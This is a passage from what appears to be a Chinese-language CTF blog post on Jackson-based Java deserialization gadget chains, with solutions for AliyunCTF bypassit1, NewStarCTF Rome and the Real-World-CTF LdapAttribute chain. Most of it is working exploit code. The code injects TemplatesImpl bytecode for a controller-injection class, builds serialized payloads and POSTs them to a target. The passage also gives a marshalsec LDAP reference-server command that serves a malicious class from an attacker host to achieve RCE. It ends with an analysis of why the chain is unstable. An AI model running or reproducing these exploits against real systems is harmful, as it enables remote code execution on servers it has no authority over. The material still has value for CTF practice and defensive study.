class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);        oos.writeObject(o);        oos.close();        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());        <span class="hljs-keyword">return</span> base64String;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);        ois.readObject();        ois.close();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);        field.setAccessible(<span class="hljs-literal">true</span>);        field.set(obj, value);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPOST</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">requestHeaders</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();        requestHeaders.set(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;text/plain&quot;</span>);<span class="hljs-comment">//        URI url = new URI(&quot;http://neepusec.fun:27010/nomap&quot;);</span>        <span class="hljs-type">URI</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URI</span>(<span class="hljs-string">&quot;http://192.168.113.134:8080/bypassit&quot;</span>);        <span class="hljs-comment">//URI url = new URI(&quot;http://localhost:8080/bypassit&quot;);</span>        HttpEntity&lt;<span class="hljs-type">byte</span>[]&gt; requestEntity = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span> &lt;&gt; (obj,requestHeaders);        <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);        System.out.println(res.getBody());    &#125;&#125;</code></pre></div><h2 id="AliyunCTF-bypassit1"><a href="#AliyunCTF-bypassit1" class="headerlink" title="AliyunCTF bypassit1"></a>AliyunCTF bypassit1</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<span class="hljs-keyword">import</span> org.springframework.http.HttpEntity;<span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<span class="hljs-keyword">import</span> javax.xml.transform.Templates;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.net.URI;<span class="hljs-keyword">import</span> java.nio.file.Files;<span class="hljs-keyword">import</span> java.nio.file.Paths;<span class="hljs-keyword">import</span> java.security.*;<span class="hljs-keyword">import</span> java.sql.SQLOutput;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<span class="hljs-comment">//        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;));</span>        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\jackson\\InjectToController.class&quot;</span>));        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;bytecodes&#125;);        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templatesimpl);        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);        setValue(exp,<span class="hljs-string">&quot;val&quot;</span>,jsonNodes);        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);        objectOutputStream.writeObject(exp);<span class="hljs-comment">//        deserial(serial(objectOutputStream));</span>        FileOutputStream fout=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;1.ser&quot;</span>);        fout.write(barr.toByteArray());        fout.close();        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;1.ser&quot;</span>);        <span class="hljs-type">byte</span>[] byt=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[fileInputStream.available()];        fileInputStream.read(byt);        doPOST(byt);<span class="hljs-comment">//        System.out.println((serial(exp)));</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);        oos.writeObject(o);        oos.close();        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());        <span class="hljs-keyword">return</span> base64String;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);        ois.readObject();        ois.close();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);        field.setAccessible(<span class="hljs-literal">true</span>);        field.set(obj, value);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPOST</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">requestHeaders</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();        requestHeaders.set(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;text/plain&quot;</span>);<span class="hljs-comment">//        URI url = new URI(&quot;http://neepusec.fun:27010/nomap&quot;);</span>        <span class="hljs-type">URI</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URI</span>(<span class="hljs-string">&quot;http://192.168.113.134:8080/bypassit&quot;</span>);        <span class="hljs-comment">//URI url = new URI(&quot;http://localhost:8080/bypassit&quot;);</span>        HttpEntity&lt;<span class="hljs-type">byte</span>[]&gt; requestEntity = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span> &lt;&gt; (obj,requestHeaders);        <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);        System.out.println(res.getBody());    &#125;&#125;</code></pre></div><h2 id="NewStarCTF-2022-Rome"><a href="#NewStarCTF-2022-Rome" class="headerlink" title="NewStarCTF 2022  Rome"></a>NewStarCTF 2022  Rome</h2><p>很明显是打Rome链子，但我们就打jackson</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<span class="hljs-keyword">import</span> org.springframework.http.HttpEntity;<span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<span class="hljs-keyword">import</span> javax.xml.transform.Templates;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.net.URI;<span class="hljs-keyword">import</span> java.nio.file.Files;<span class="hljs-keyword">import</span> java.nio.file.Paths;<span class="hljs-keyword">import</span> java.security.*;<span class="hljs-keyword">import</span> java.sql.SQLOutput;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<span class="hljs-comment">//        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;));</span>        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\jackson\\InjectToController.class&quot;</span>));        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;bytecodes&#125;);        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templatesimpl);        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);        setValue(exp,<span class="hljs-string">&quot;val&quot;</span>,jsonNodes);        System.out.println((serial(exp)));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);        oos.writeObject(o);        oos.close();        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());        <span class="hljs-keyword">return</span> base64String;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);        ois.readObject();        ois.close();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);        field.setAccessible(<span class="hljs-literal">true</span>);        field.set(obj, value);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPOST</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">requestHeaders</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();        requestHeaders.set(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;text/plain&quot;</span>);<span class="hljs-comment">//        URI url = new URI(&quot;http://neepusec.fun:27010/nomap&quot;);</span>        <span class="hljs-type">URI</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URI</span>(<span class="hljs-string">&quot;http://192.168.113.134:8080/bypassit&quot;</span>);        <span class="hljs-comment">//URI url = new URI(&quot;http://localhost:8080/bypassit&quot;);</span>        HttpEntity&lt;<span class="hljs-type">byte</span>[]&gt; requestEntity = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span> &lt;&gt; (obj,requestHeaders);        <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);        System.out.println(res.getBody());    &#125;&#125;</code></pre></div><p>生成结果拿去URL编码后POST就行了</p><h2 id="LdapAttribute链"><a href="#LdapAttribute链" class="headerlink" title="LdapAttribute链"></a>LdapAttribute链</h2><p>Real-World-CTF 2021</p><p>主角就是<code>com.sun.jndi.ldap.LdapAttribute</code></p><p>原题中作者是实战java1.4的古老版本挖掘的链子，但这个类java8也有，所以可以用</p><p>看的是Boogipop的文章<a href="https://boogipop.com/2023/05/16/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/#LdapAttribute%E9%93%BE">Jackson反序列化通杀Web题(过时) - Boogiepop Doesn’t Laugh (boogipop.com)</a></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.ArrayNode;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.ValueNode;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<span class="hljs-keyword">import</span> javassist.*;<span class="hljs-keyword">import</span> org.springframework.http.HttpEntity;<span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<span class="hljs-keyword">import</span> javax.management.JMX;<span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<span class="hljs-keyword">import</span> javax.naming.CompositeName;<span class="hljs-keyword">import</span> javax.sql.rowset.BaseRowSet;<span class="hljs-keyword">import</span> javax.xml.transform.Templates;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.net.URI;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-comment">/**</span><span class="hljs-comment"> * Hello world!</span><span class="hljs-comment"> *</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapAttributeChain</span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">( String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">ldapCtxUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:1099/&quot;</span>;        <span class="hljs-type">Class</span> <span class="hljs-variable">ldapAttributeClazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);        <span class="hljs-type">Constructor</span> <span class="hljs-variable">ldapAttributeClazzConstructor</span> <span class="hljs-operator">=</span> ldapAttributeClazz.getDeclaredConstructor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class&#125;);        ldapAttributeClazzConstructor.setAccessible(<span class="hljs-literal">true</span>);        <span class="hljs-type">Object</span> <span class="hljs-variable">ldapAttribute</span> <span class="hljs-operator">=</span> ldapAttributeClazzConstructor.newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;name&quot;</span>&#125;);        <span class="hljs-type">Field</span> <span class="hljs-variable">baseCtxUrlField</span> <span class="hljs-operator">=</span> ldapAttributeClazz.getDeclaredField(<span class="hljs-string">&quot;baseCtxURL&quot;</span>);        baseCtxUrlField.setAccessible(<span class="hljs-literal">true</span>);        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);        <span class="hljs-type">Field</span> <span class="hljs-variable">rdnField</span> <span class="hljs-operator">=</span> ldapAttributeClazz.getDeclaredField(<span class="hljs-string">&quot;rdn&quot;</span>);        rdnField.setAccessible(<span class="hljs-literal">true</span>);        rdnField.set(ldapAttribute, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompositeName</span>(<span class="hljs-string">&quot;a//b&quot;</span>));        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(ldapAttribute);        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);        val.setAccessible(<span class="hljs-literal">true</span>);        val.set(exp,jsonNodes);        deserial(serial(exp));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException &#123;        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);        <span class="hljs-comment">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span>        <span class="hljs-comment">//writeReplaceMethod.setAccessible(true);</span>        oos.writeObject(o);        oos.close();        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());        <span class="hljs-keyword">return</span> base64String;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);        ois.readObject();        ois.close();    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Base64Encode</span><span class="hljs-params">(ByteArrayOutputStream bs)</span>&#123;        <span class="hljs-type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encode);        System.out.println(s);        System.out.println(s.length());    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);        f.setAccessible(<span class="hljs-literal">true</span>);        f.set(obj, arg);    &#125;&#125;</code></pre></div><h3 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h3><p>前面一样，invoke之后开始</p><p>有两个get方法，我们使用下面这个</p><p><img src="/../images/Jackson/image-20231118001138170.png" alt="image-20231118001138170"></p><p><img src="/../images/Jackson/image-20231118002202020.png" alt="image-20231118002202020"></p><p>这里能够jndi注入，出题人就是这里发现能够利用</p><p><img src="/../images/Jackson/image-20231118002455283.png" alt="image-20231118002455283"></p><p><img src="/../images/Jackson/image-20231118002832449.png" alt="image-20231118002832449"></p><p>getUsingURL方法中会获取DN，但是获取的格式为<code>cn=,dn=</code>，假如我们加了后缀，我们后台收到的数据是：</p><p><img src="/../images/Jackson/image-20231118002948992.png" alt="image-20231118002948992"></p><p>他默认会加一个a呢，这个是payload里<code>a//b</code>决定的，具体的是<code>a//b , rename xx &#39;a&#39;</code>调试的时候大概看到这个东西</p><p>所以我们需要换个工具，如marshall，创建一个类名为a的恶意类，然后按照要求放置即可~</p><p><code> java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://xx.xx.xx.xx:8000/#a 1099</code></p><p>然后就能RCE</p><h1 id="jacksn链子不稳定问题"><a href="#jacksn链子不稳定问题" class="headerlink" title="jacksn链子不稳定问题"></a>jacksn链子不稳定问题</h1><p><a href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/">关于java反序列化中jackson链子不稳定问题 (pankas.top)</a></p><p>虽然我暂时没遇到过报错，但还是多了解一下</p><p>有时会遇到这样的报错</p><div class="code-wrapper"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span><span class="hljs-selector-class">.JsonMappingException</span>: (was java<span class="hljs-selector-class">.lang</span>.NullPointerException) (through reference chain: com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span><span class="hljs-selector-class">.trax</span><span class="hljs-selector-class">.TemplatesImpl</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;stylesheetDOM&quot;</span>]</span>)</code></pre></div><h2 id="根本原因"><a href="#根本原因" class="headerlink" title="根本原因"></a>根本原因</h2><p><img src="/../images/Jackson/image-20231118154029847.png" alt="image-20231118154029847"></p><p><code>props</code>数组中每个值是<code>BeanPropertyWriter</code> 类型对象，之后循环调用其中的<code>serializeAsField</code> 方法来执行对应方法。而另一边通过分析，<code>props</code>是通过反射 <code>getDeclaredMethods</code> 方法获取到的 ，因此<code>props</code>数组顺序是不确定的</p><p>并且当第一次出错后，后面就不会成功，这是因为jackson这个 <code>com.fasterxml.jackson.databind.SerializerProvider#findTypedValueSerializer(java.lang.Class&lt;?&gt;, boolean, com.fasterxml.jackson.databind.BeanProperty)</code> 中获取序列化器有缓存机制</p><h2 id="流程分析-2"><a href="#流程分析-2" class="headerlink" title="流程分析"></a>流程分析</h2><p>找清楚这个<code>props</code> 数组的顺序，一路追踪这个变量，发现其根源是在 <code>com.fasterxml.jackson.databind.introspect.POJOPropertiesCollector#collectAll</code>中调用 <code>_addMethods(props)</code> 方法来获取相关 getter 方法，之后将其添加到 <code>prpos</code> 属性中。</p><p><img src="/../images/Jackson/image-20231118155057092.png" alt="image-20231118155057092"></p><h2 